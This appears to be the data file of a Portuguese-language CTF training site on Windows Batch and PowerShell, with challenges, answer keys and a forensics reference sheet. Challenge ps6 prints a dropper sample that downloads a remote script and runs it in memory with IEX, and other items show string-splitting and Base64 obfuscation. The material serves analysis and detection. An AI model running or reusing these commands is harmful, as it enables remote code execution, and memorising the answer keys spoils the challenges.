    id: 'bat5', cat: 'bat', level: 'avancado',
    title: 'Fatias de string',
    desc: 'Um .bat suspeito foi recuperado. Ele não contém a string completa em lugar nenhum — ela é montada por expansões de substring antes do echo.',
    task: 'Qual é a <b>saída exata</b> do comando echo?',
    format: 'Formato: CTF{...}',
    artifact: {
      label: 'drop.bat (amostra de ofuscação)',
      lang: 'bat',
      content:
`@echo off
set a=XXCTF{subXXXX
set b=aastring_bb
set c=QQ_bat}
echo %a:~2,7%%b:~2,6%%c:~2%`,
    },
    answers: ['ctf{substring_bat}'],
    hints: [
      'A notação %var:início,tamanho% extrai uma fatia: %a:~2,7% pega 7 caracteres a partir do índice 2 (o 1º é o índice 0).',
      'Monte: fatia de a = "CTF{sub" · fatia de b = "string" · fatia de c = "_bat}" (do índice 2 até o fim, sem tamanho).',
    ],
    explain:
      `<h4>Por quê</h4><code>CTF{substring_bat}</code>
       <br><br><b>Passo a passo:</b>
       <br>• <code>%a:~2,7%</code> → de <code>XXCTF{subXXXX</code> pula os 2 X e pega 7 → <code>CTF{sub</code>
       <br>• <code>%b:~2,6%</code> → de <code>aastring_bb</code> pula <code>aa</code> → <code>string</code>
       <br>• <code>%c:~2%</code> → de <code>QQ_bat}</code> pula <code>QQ</code> e vai até o fim → <code>_bat}</code>
       <br><br><b>Sintaxe:</b> <code>%var:~N,M%</code> (N iniciando em 0) · <code>%var:~N%</code> (até o fim) · <code>%var:~-5%</code> (últimos 5) · <code>%var:antigo=novo%</code> (substituição literal).
       <br>Com delayed expansion vira <code>!var:~0,4!</code> — muito usado em malware .bat para montar URLs/senhas sem deixar a string pronta no binário.
       <br><b>Dica de análise:</b> rode <code>cmd /v:on /c drop.bat</code> ou coloque <code>@echo on</code> para ver cada expansão.`,
  },
  {
    id: 'bat6', cat: 'bat', level: 'avancado',
    title: 'Fatiando o PATH',
    desc: 'Auditoria de ambiente: o script abaixo isola um trecho da variável <code>PATH</code> usando substituição de string com curinga.',
    task: 'Qual é a <b>saída</b> do echo?',
    format: 'Formato: caminho(s) separados como no original',
    artifact: {
      label: 'pathcheck.bat',
      lang: 'bat',
      content:
`@echo off
set "P=C:\\Windows\\System32;C:\\Users\\Public\\bin;C:\\Tools"
set "FIRST=%P:*;=%"
echo %FIRST%`,
    },
    answers: [
      'c:\\users\\public\\bin;c:\\tools',
      'c:\\users\\public\\bin; c:\\tools',
      'c:\\users\\public\\bin ; c:\\tools',
      'users\\public\\bin;c:\\tools',
    ],
    hints: [
      'A substituição %var:busca=% apaga o que casa com "busca"; o curinga * antes significa "tudo até a primeira ocorrência".',
      '%P:*;=% apaga "tudo até o primeiro ponto-e-vírgula" — sobra o que vem depois dele.',
    ],
    explain:
      `<h4>Por quê</h4><code>C:\\Users\\Public\\bin;C:\\Tools</code>
       <br><br><b>Mecanismo:</b> em <code>%P:*;=%</code>, o padrão <code>*;</code> casa com <i>qualquer coisa + ;</i> — ou seja, remove tudo até o <b>primeiro</b> <code>;</code> (inclusive ele), deixando o restante.
       <br><br><b>Variações:</b> <code>%P:;= %</code> troca todos os <code>;</code> por espaço · <code>%P:~0,12%</code> pega os 12 primeiros caracteres · <code>%P:~-9%</code> os últimos 9.
       <br><b>Por que importa:</b> é assim que scripts (e malware) fatiam PATH/URLs — e a 1ª pasta do PATH é a que vence na resolução de executáveis (volte ao desafio cfg6).`,
  },

  /* ========================= POWERSHELL ========================= */
  {
    id: 'ps1', cat: 'ps1', level: 'iniciante',
    title: 'O ls do PowerShell',
    desc: 'Você abriu o PowerShell e quer listar o conteúdo do diretório atual — mas usando o cmdlet nativo (nome no padrão Verbo-Substantivo), não o alias.',
    task: 'Qual é o <b>cmdlet</b> que lista itens de um diretório? (nome completo, Verbo-Noun)',
    format: 'Formato: verbo-substantivo',
    answers: ['get-childitem', 'get childitem', 'getchilditem', 'gci', 'dir', 'ls'],
    hints: [
      'Começa com Get- e o substantivo é "ChildItem" (item filho).',
      'É o Get-ChildItem (aliases: gci, dir, ls).',
    ],
    explain:
      `<h4>Por quê</h4><code>Get-ChildItem</code> (aliases <code>gci</code>, <code>dir</code>, <code>ls</code>).
       <br><br><b>Descubra cmdlets:</b> <code>Get-Command -Verb Get</code> · <code>Get-Help Get-ChildItem -Examples</code> · <code>Get-Help *-Item</code>.
       <br><b>Parâmetros mais usados:</b> <code>-Recurse</code> (desce em subpastas) · <code>-Force</code> (ocultos/system) · <code>-File</code>/<code>-Directory</code> · <code>-Filter *.log</code> · <code>-Depth 2</code>.
       <br><b>Navegação:</b> <code>Set-Location</code> (cd) · <code>Push-Location</code>/<code>Pop-Location</code> (pilha) · <code>Test-Path</code> (existe?).
       <br><b>Equivalências CMD→PS:</b> dir→Get-ChildItem · type→Get-Content · del→Remove-Item · copy→Copy-Item · ren→Rename-Item.`,
  },
  {
    id: 'ps2', cat: 'ps1', level: 'iniciante',
    title: 'Filtrando objetos, não texto',
    desc: 'Diferente do <code>findstr</code> (que caça texto cru), o PowerShell filtra <b>objetos</b> com propriedades. Você precisa deixar só os serviços em execução.',
    task: 'Qual cmdlet/operador do pipeline <b>filtra objetos</b> por condição?',
    format: 'Formato: nome do cmdlet (ou alias)',
    answers: ['where-object', 'where object', 'where', '?', 'where-object-status'],
    hints: [
      'Mesmo nome do operador SQL (WHERE) no padrão Verbo-Substantivo...',
      'É o Where-Object (alias: ?, Where). Ex.: Get-Service | Where-Object {$_.Status -eq "Running"}',
    ],
    explain:
      `<h4>Por quê</h4><code>Where-Object</code> (alias <code>?</code>).
       <br><br><b>Formas de usar:</b>
       <br>• Script block: <code>Get-Process | Where-Object { $_.CPU -gt 100 -and $_.Path -like 'C:\\Temp\\*' }</code>
       <br>• Simplificado: <code>Get-Service | Where-Object Status -eq Running</code>
       <br><b>Operadores:</b> <code>-eq -ne -gt -ge -lt -le</code> · <code>-like 'a*'</code> (curinga) · <code>-match 'regex'</code> · <code>-contains</code> · combinando com <code>-and</code>/<code>-or</code>/<code>-not</code>.
       <br><code>$_</code> = objeto atual do pipeline.
       <br><b>Vizinhos:</b> <code>Select-Object -First 5</code> (corta) · <code>Sort-Object CPU</code> · <code>Measure-Object</code> (conta/soma) · <code>Group-Object Status</code> (agrupa).`,
  },
  {
    id: 'ps3', cat: 'ps1', level: 'intermediario',
    title: 'O cmdlet dos logs modernos',
    desc: 'A máquina tem dezenas de GB em <code>.evtx</code> (Security, System, PowerShell/Operational). Você precisa consultar logs modernos com filtro de hashtable — o <code>Get-EventLog</code> é legado e só enxerga os logs clássicos.',
    task: 'Qual é o cmdlet moderno para consultar logs EVTX com <code>-FilterHashtable</code>?',
    format: 'Formato: nome do cmdlet',
    answers: ['get-winevent', 'get winevent', 'get-winevents', 'winevent'],
    hints: [
      'Win = Windows Event Log, "Event"... ',
      'É o Get-WinEvent (ex.: Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4625}).',
    ],
    explain:
      `<h4>Por quê</h4><code>Get-WinEvent</code> — o cmdlet para TODOS os logs modernos (inclui Microsoft-Windows-*, Sysmon, PowerShell).
       <br><br><b>Exemplo real:</b>
       <br><code>Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625,4624; StartTime=(Get-Date).AddHours(-24)} -MaxEvents 50</code>
       <br><b>Hashtable aceita:</b> <code>LogName</code> · <code>ID</code> · <code>Level</code> (2=Crit,3=Error,4=Warn,5=Info) · <code>ProviderName</code> ('Microsoft-Windows-PowerShell') · <code>StartTime/EndTime</code> · <code>ProcessId</code> · <code>Keywords</code>.
       <br><b>Extras:</b> <code>-Oldest</code> (ordem antiga→nova) · <code>.ToXml()</code> (XML cru) · contagem: <code>(Get-WinEvent ...).Count</code> ou <code>| Measure-Object</code>.
       <br><b>CLI:</b> <code>wevtutil qe Security /q:"*[System[(EventID=4625)]]" /c:20 /f:text</code> · <code>Get-WinEvent -ListLog *</code> para listar logs.`,
  },
  {
    id: 'ps4', cat: 'ps1', level: 'intermediario',
    title: 'Rastreando a pipeline',
    desc: 'Siga o código linha a linha na cabeça (ou rode no seu console) e descubra o que ele devolve no final.',
    task: 'Qual é a <b>saída final</b> da pipeline?',
    format: 'Formato: valor exato impresso',
    artifact: {
      label: 'hunt.ps1',
      lang: 'ps1',
      content:
`$procs = @(
    [pscustomobject]@{ Name = 'svchost';  Path = 'C:\\Windows\\System32\\svchost.exe' }
    [pscustomobject]@{ Name = 'updater';   Path = 'C:\\Users\\Public\\updater.exe' }
    [pscustomobject]@{ Name = 'OneDrive';  Path = 'C:\\Users\\jmoraes\\AppData\\Local\\OneDrive\\OneDrive.exe' }
    [pscustomobject]@{ Name = 'schtasks';  Path = 'C:\\Windows\\System32\\schtasks.exe' }
)

$procs |
    Where-Object { $_.Path -notlike 'C:\\Windows\\*' } |
    ForEach-Object { $_.Name } |
    Sort-Object |
    Select-Object -First 1`,
    },
    answers: ['onedrive', 'one drive'],
    hints: [
      'Primeiro filtro: quais Path NÃO começam com C:\\Windows\\*? Restam 2 itens.',
      'Restam "updater" e "OneDrive"; o Sort-Object é case-insensitive (o<u) e o -First 1 pega o primeiro.',
    ],
    explain:
      `<h4>Por quê</h4><code>OneDrive</code>
       <br><br><b>Passo a passo:</b>
       <br>1) <b>Where-Object</b> <code>-notlike 'C:\\Windows\\*'</code> → remove svchost e schtasks; sobram <code>updater</code> e <code>OneDrive</code>.
       <br>2) <b>ForEach-Object</b> <code>{ $_.Name }</code> → a pipeline agora tem strings.
       <br>3) <b>Sort-Object</b> → ordem alfabética case-insensitive: OneDrive, updater.
       <br>4) <b>Select-Object -First 1</b> → <code>OneDrive</code>.
       <br><br><b>Dica de vida:</b> depure pipelines com <code>Set-PSDebug -Trace 1</code> ou vá inserindo <code>| Out-String</code> / <code>| Format-Table</code> entre os estágios. Caçar processos fora de <code>C:\\Windows\\*</code> é um ótimo hunting de inicialidade.`,
  },
  {
    id: 'ps5', cat: 'ps1', level: 'avancado',
    title: 'Quebrando o -EncodedCommand',
    desc: 'O argumento abaixo foi extraído de um 4688/Sysmon 1. O autor usou o truque padrão: Base64 de <b>UTF-16LE</b> para esconder o comando do PowerShell.',
    task: 'Decodifique a string. <b>Qual flag</b> ela revela?',
    format: 'Formato: CTF{...}',
    artifact: {
      label: 'amostra — decodificação',
      lang: 'ps1',
      content:
`# string extraída da linha de comando (Event 4688)
$b64 = 'QwBUAEYAewBiAGEAcwBlADYANABfAHUAdABmADEANgBsAGUAfQA='

# o que o PowerShell faria:
# [Text.Encoding]::Unicode.GetString(
#     [Convert]::FromBase64String($b64)
# )

# ou no bash:
# echo '<b64>' | base64 -d | iconv -f UTF-16LE`,
    },
    answers: ['ctf{base64_utf16le}'],
    hints: [
      'Unicode (.NET) = UTF-16LE. Se decodificar como UTF-8 você verá "C\\x00T\\x00F\\x00{...".',
      'No bash: echo \'QwBUAEYAewBiAGEAcwBlADYANABfAHUAdABmADEANgBsAGUAfQA=\' | base64 -d | iconv -f UTF-16LE',
    ],
    explain:
      `<h4>Por quê</h4><code>CTF{base64_utf16le}</code>
       <br><br><b>Passo a passo:</b> Base64 → bytes → UTF-16LE → texto.
       <br>• PowerShell: <code>[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))</code>
       <br>• Bash: <code>echo '...' | base64 -d | iconv -f UTF-16LE</code>
       <br>• Python: <code>base64.b64decode(s).decode('utf-16-le')</code>
       <br><br><b>Por que UTF-16LE?</b> O parâmetro <code>-EncodedCommand</code>/<code>-e</code>/<code>-EnC</code> do powershell.exe exige UTF-16LE sem BOM — por isso os bytes têm \\x00 intercalados.
       <br><b>Cuidados:</b> decodificar como UTF-8 "funciona" mas vira lixo; o comando limita a 8191 caracteres (cmd) e ~32k (powershell -Command).
       <br><b>Detecção defensiva:</b> 4688 com <code>-enc</code> + evento <b>4104</b> (script block grava o código <i>já decodificado</i>) + Sysmon 1 com CommandLine.`,
  },
  {
    id: 'ps6', cat: 'ps1', level: 'avancado',
    title: 'Engenharia reversa do dropper',
    desc: 'Recuperamos o início de um dropper em <code>C:\\ProgramData\\cache</code>. O autor dividiu a URL em pedaços para fugir de varredura de strings — mas o script precisa reconstruí-la em memória antes de baixar.',
    task: 'Reconstrua a variável <code>$target</code>. Qual é a <b>URL completa</b> usada para baixar o payload?',
    format: 'Formato: URL completa (com http://...)',
    artifact: {
      label: 'C:\\ProgramData\\cache\\dropper.ps1',
      lang: 'ps1',
      content:
`$a = 'http'
$b = '://10.0.0'
$c = '.5/sync'
$d = '.ps1'

$ua = 'Mozilla/5.0 (Windows NT 10.0'
$ua = $ua + '; Win64; x64)'

$target = $a + $b + $c + $d

# continua: baixa e executa em memoria
$client = New-Object System.Net.WebClient
$client.Headers['User-Agent'] = $ua
$client.DownloadString($target) | IEX`,
    },
    answers: ['http://10.0.0.5/sync.ps1', 'http://10.0.0.5/sync.ps1/'],
    hints: [
      `Concatene em ordem: $a + $b primeiro, depois acrescente $c e $d (o $ua é só o User-Agent)`,
      'Pedidos: $a + $b = http://10.0.0 ; depois \'.5/sync\' ; depois \'.ps1\'. O $ua é só o User-Agent.',
    ],
    explain:
      `<h4>Por quê</h4><code>http://10.0.0.5/sync.ps1</code>
       <br><br><b>Leitura:</b> <code>$a+$b</code> → <code>http://10.0.0</code> · <code>+$c</code> → <code>http://10.0.0.5/sync</code> · <code>+$d</code> → <code>http://10.0.0.5/sync.ps1</code>.
       <br><br><b>Por que atacantes fazem isso:</b> strings completas aparecem em <i>strings dumps</i>/assinaturas YARA; concatenação quebra a regra literal (o <code>4104</code> do Script Block Logging, porém, grava o valor <b>final</b> depois da concatenação).
       <br><b>Como caçar sem decodificar na mão:</b> eventos <b>4104</b> com <code>DownloadString</code>/<code>IEX</code>, Sysmon <b>ID 3</b> (network connect) a partir de <code>powershell.exe</code>, logs de proxy/EGress URL e AMSI (o download+execução é detectado na carga).
       <br><b>Blue team:</b> <code>Constrained Language Mode</code> + <code>WinRM/WinHTTP</code> logging + bloquear <code>WebClient</code> via AppLocker/WDAC.`,
  },
];

/* ========================= REFERÊNCIA ========================= */
const REFERENCE = [
  {
    id: 'paths', title: 'Caminhos essenciais', sub: 'Onde o Windows guarda as coisas (e onde o atacante esconde).',
    items: [
      { k: 'hosts', v: '<b>C:\\Windows\\System32\\drivers\\etc\\hosts</b> — sem extensão, precisa admin' },
      { k: 'logs', v: '<b>C:\\Windows\\System32\\winevt\\Logs\\</b> — Security.evtx, System.evtx, PowerShell-Operational.evtx' },
      { k: 'GPO local', v: '<b>C:\\Windows\\System32\\GroupPolicy\\</b> (+ GPT.ini, \\Users para GPO de usuário)' },
      { k: 'Startup user', v: '<b>%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</b> (shell:startup)' },
      { k: 'Startup all', v: '<b>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</b>' },
      { k: 'Tarefas', v: '<b>C:\\Windows\\System32\\Tasks\\</b> — XMLs agendados (ler com type/findstr)' },
      { k: 'Serviços', v: '<b>HKLM\\SYSTEM\\CurrentControlSet\\Services\\&lt;nome&gt;</b> — ImagePath, Start, Type' },
      { k: 'Temp', v: '<b>%TEMP%</b> = <b>C:\\Users\\&lt;u&gt;\\AppData\\Local\\Temp</b> · <b>%PUBLIC%</b> = C:\\Users\\Public' },
      { k: 'Drivers', v: '<b>C:\\Windows\\System32\\drivers\\</b> · System32\\DriverStore\\FileRepository' },
      { k: 'PowerShell profile', v: '<b>Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1</b>' },
      { k: 'WMI persist', v: '<b>HKLM\\SOFTWARE\\Microsoft\\WBEM\\Repository</b> + __EventFilter/__EventConsumer (OMS)' },
      { k: 'Saved creds', v: '<b>cmdkey /list</b> · Vault: <b>cmdkey /generic:target</b> · DPAPI blobs no perfil' },
    ],
  },
  {
    id: 'events', title: 'Event IDs que você precisa decorar', sub: 'Security, System, PowerShell e Sysmon.',
    items: [
      { k: '4624', v: '<b>Logon com sucesso</b> — Type 2 interativo, 3 rede, 4 batch, 5 serviço, 10 RDP' },
      { k: '4625', v: '<b>Falha de logon</b> — SubStatus 0xC000006A senha, 0xC0000064 usuário inexistente' },
      { k: '4648', v: 'Logon com <b>credenciais explícitas</b> (runas / credenciais digitadas)' },
      { k: '4672', v: '<b>Privilégios especiais</b> concedidos (SeDebugPrivilege = alerta)' },
      { k: '4688', v: '<b>Criação de processo</b> — habilite "Include command line" na GPO' },
      { k: '4720 / 4726', v: '<b>Criada / excluída</b> conta de usuário' },
      { k: '4722 / 4724', v: 'Conta <b>habilitada</b> / <b>senha redefinida</b>' },
      { k: '4732 / 4728', v: 'Membro adicionado a grupo <b>local</b> / de <b>domínio</b>' },
      { k: '4740', v: 'Conta <b>bloqueada</b> (lockout — fim do brute force)' },
      { k: '4768 / 4769', v: 'Pedido/issue de <b>TGT Kerberos</b> — Silver/Golden Ticket moram aqui' },
      { k: '1102', v: '<b>Auditoria do log foi APAGADA</b> (Security) — o sinal nº1 de cover-up' },
      { k: '104', v: 'O <b>System</b> log foi limpo (System event log cleared)' },
      { k: '7045', v: '<b>Novo serviço instalado</b> (System)' },
      { k: '7036', v: 'Serviço entrou em <b>execução</b> / parou' },
      { k: '4103 / 4104', v: 'PowerShell: <b>módulo</b> / <b>script block</b> (grava o código desobfusado)' },
      { k: '400 / 403', v: 'PowerShell engine início/fim (legado, sem detalhe)' },
      { k: 'Sysmon 1', v: 'Process creation (com hash MD5/SHA256/Imphash e CommandLine)' },
      { k: 'Sysmon 3', v: '<b>Conexão de rede</b> saída (C2 hunting)' },
      { k: 'Sysmon 11 / 13', v: '<b>Criou arquivo</b> / <b>alterou valor de registro</b>' },
      { k: 'Sysmon 22', v: 'Consulta DNS (mais uma janela para C2)' },
    ],
  },
  {
    id: 'registry', title: 'Registro — chaves de persistência', sub: 'reg query, .reg e os nós que causam incidente.',
    items: [
      { k: 'HKCU\\...\\Run', v: '<b>Software\\Microsoft\\Windows\\CurrentVersion\\Run</b> — inicializa por usuário' },
      { k: 'HKLM\\...\\Run', v: 'Mesmo caminho em HKLM — vale para todas as contas' },
      { k: 'RunOnce', v: 'Mesmo nó, roda <b>uma vez</b> e se apaga' },
      { k: 'Policies\\Run', v: 'Software\\Microsoft\\Windows\\CurrentVersion\\<b>Policies\\Explorer\\Run</b>' },
      { k: 'Services', v: '<b>HKLM\\SYSTEM\\CurrentControlSet\\Services\\*</b> — ImagePath do SCM' },
      { k: 'IFEO', v: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\<b>Image File Execution Options</b>\\&lt;exe&gt;\\Debugger' },
      { k: 'Winlogon', v: 'HKLM\\...\\Winlogon — <b>Userinit</b>, <b>Shell</b>, <b>Notify</b> (clássica)' },
      { k: 'Defender excl.', v: 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\<b>Exclusions</b>\\Paths|Processes|Extensions' },
      { k: 'Session Mgr', v: 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\<b>Session Manager</b> — BootExecute, Environment' },
      { k: 'autoruns', v: '<b>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\</b> — Browser Helper, ShellExecuteHooks' },
      { k: 'firewall', v: 'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy"' },
      { k: 'auditpol', v: '<b>auditpol /get /category:*</b> — política de auditoria efetiva (precisa de 4688/4624 ativos)' },
    ],
  },
  {
    id: 'cmd', title: 'CMD & Batch', sub: 'Do básico ao avançado, em uma coluna.',
    items: [
      { k: 'type / more', v: 'imprimir arquivo no console · <code>type log.txt</code>' },
      { k: 'findstr', v: '<b>findstr /i /n /c:"erro" arquivo</b> — busca (i=ignora caixa, /n nº linha, /m só nomes)' },
      { k: '%~dp0', v: 'pasta do script (com \\ final) · %~f0 caminho completo · %~n0 nome · %~x0 extensão' },
      { k: 'set /a', v: 'aritmética · <code>set /a i+=1</code> · <code>set /p var=Texto: </code> pede entrada' },
      { k: 'var:~N,M', v: 'substring: <code>%p:~0,5%</code> · <code>%p:~-4%</code> últimos · <code>%p:a=b%</code> substitui' },
      { k: '&&  ||', v: '<b>&&</b> roda se OK · <b>||</b> roda se FALHAR · <code>&amp;</code> roda sempre' },
      { k: '2>&1  >nul', v: 'junta stderr na stdout · suprime tudo: <code>&gt;nul 2&gt;&amp;1</code>' },
      { k: 'for /f', v: '<b>for /f "usebackq tokens=1* delims=," %%a in ("arq") do ...</b> (%% no .bat, % no prompt)' },
      { k: 'delayed', v: '<code>setlocal EnableDelayedExpansion</code> → <b>!var!</b> dentro de blocos ( )' },
      { k: 'errorlevel', v: '<code>if errorlevel 1</code> falhou · <code>cmd /c ... && echo OK</code> · <code>exit /b 1</code>' },
      { k: 'call / start', v: '<b>call outro.bat</b> volta depois · <b>start "" "app.exe"</b> abre e segue' },
      { k: 'pushd / popd', v: 'entra na pasta (aceita UNC e cria drive temporário) e volta depois' },
      { k: 'reg query', v: '<b>reg query "HKLM\\...\\Run" /s</b> (/s = recursivo, /ve = valor padrão)' },
      { k: 'sc / net', v: '<b>sc query x</b> · <b>net user /localgroup</b> · <b>netstat -ano</b> · <b>tasklist /svc</b>' },
      { k: 'cacls/icacls', v: '<b>icacls arquivo /grant Users:(OI)(CI)M</b> — permissões NTFS' },
    ],
  },
  {
    id: 'ps', title: 'PowerShell', sub: 'Cmdlets, pipeline e triagem defensiva.',
    items: [
      { k: 'Verbo-Noun', v: '<b>Get-</b>Command · <b>Get-</b>Help · <b>Get-</b>Service · <b>Test-</b>Path' },
      { k: 'pipeline', v: 'objetos fluem: <code>Get-Process | Sort CPU -Desc | Select -First 10</code>' },
      { k: 'Where-Object', v: '<code>{ $_.Path -like "C:\\Temp\\*" }</code> · alias <code>?</code> · forma curta <code>Where Path -like "x*"</code>' },
      { k: 'Select-Object', v: '<b>-First/-Last</b> · <b>-ExpandProperty Name</b> · <b>Property a,b</b> · <b>-Property @{n="X";e={...}}</b>' },
      { k: 'Group/Measure', v: '<b>Group-Object Status</b> (contagem) · <b>Measure-Object -Sum CPU</b>' },
      { k: 'Get-WinEvent', v: '<code>-FilterHashtable @{LogName="Security";ID=4625;StartTime=...}</code> · <b>-MaxEvents</b> · <b>-Oldest</b>' },
      { k: 'Get-Content', v: 'ler logs: <b>Get-Content x.log -Tail 50 -Wait</b> (streaming estilo tail -f)' },
      { k: 'PSDrive', v: '<code>Get-PSDrive</code> · <b>Registry::</b> acesso ao registro: <code>Get-ChildItem Registry::HKLM:\\SOFTWARE</code>' },
      { k: 'Impersonation', v: '<b>whoami /priv</b> · <b>whoami /groups</b> · <code>[Security.Principal.WindowsIdentity]::GetCurrent()</code>' },
      { k: 'encoded', v: '<b>powershell -enc &lt;base64 UTF-16LE&gt;</b> — decodifique com [Text.Encoding]::Unicode' },
      { k: 'exec policy', v: '<b>Get-ExecutionPolicy -List</b> · <b>-ExecutionPolicy Bypass -File x.ps1</b> (não é controle de acesso!)' },
      { k: 'wmi / cim', v: '<b>Get-CimInstance Win32_Process</b> (CommandLine) · <b>Get-CimInstance Win32_StartupCommand</b>' },
      { k: 'services', v: '<b>Get-Service | ? {$_.Status -eq "Running"} | ft</b> · <b>Get-WmiObject Win32_Service -Filter "StartMode=\'Auto\'"</b>' },
      { k: 'erro', v: '<b>$Error[0]</b> · <b>try/catch -ErrorAction Stop</b> · <b>Out-String -Width 200</b> conserta quebras' },
      { k: 'logs ps', v: '<b>Get-WinEvent -ListProvider *PowerShell*</b> · log "Windows PowerShell" (400/403) x "Operational" (4103/4104)' },
    ],
  },
  {
    id: 'tools', title: 'Ferramentas & hunting', sub: 'MMC, CLI e OSINT de endpoint.',
    items: [
      { k: 'eventvwr', v: 'Event Viewer · filtros customizados salvos em <b>C:\\ProgramData\\Microsoft\\Event Viewer\\Views</b>' },
      { k: 'wevtutil', v: '<b>wevtutil qe Security /c:50 /rd:true /f:text</b> · <b>wevtutil gl security</b> (verifica se está cheio/limpo)' },
      { k: 'gpedit / gpresult', v: '<b>gpedit.msc</b> · <b>gpresult /h rel.html</b> · <b>gpupdate /force</b>' },
      { k: 'secedit', v: '<b>secedit /analyze /db sec.sdb</b> — auditoria de política de segurança local' },
      { k: 'taskschd', v: '<b>schtasks /query /fo LIST /v</b> — mostra linha de comando de todas as tarefas' },
      { k: 'services.msc', v: 'serviços gráfico · <b>services.msc</b> ↔ <b>sc qc nome</b> ↔ chave Services no registro' },
      { k: 'sysinternals', v: '<b>Autoruns</b> (persistência) · <b>ProcMon</b> (filtros Path/Result) · <b>TCPView</b> · <b>Sigcheck</b> (assinaturas)' },
      { k: 'sysmon', v: '<b>Sysmon64 -i config.xml</b> · config em <b>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Sysmon</b>' },
      { k: 'autoruns64', v: 'tira screenshot de TODA persistência; olhe as abas ocultas por padrão (Winlogon, WMI, Gadgets)' },
      { k: 'fsutil', v: '<b>fsutil volume diskfree c:</b> · <b>fsutil file queryAllocRanges</b> (arquivos ocultos em slack)' },
      { k: 'bcdedit', v: '<b>bcdedit /enum</b> — boot tamper, testsigning, debug' },
      { k: 'powercfg', v: '<b>powercfg /energy</b> · <b>powercfg /sleepstudy</b> — também gera relatórios de energia suspeitos' },
    ],
  },
];
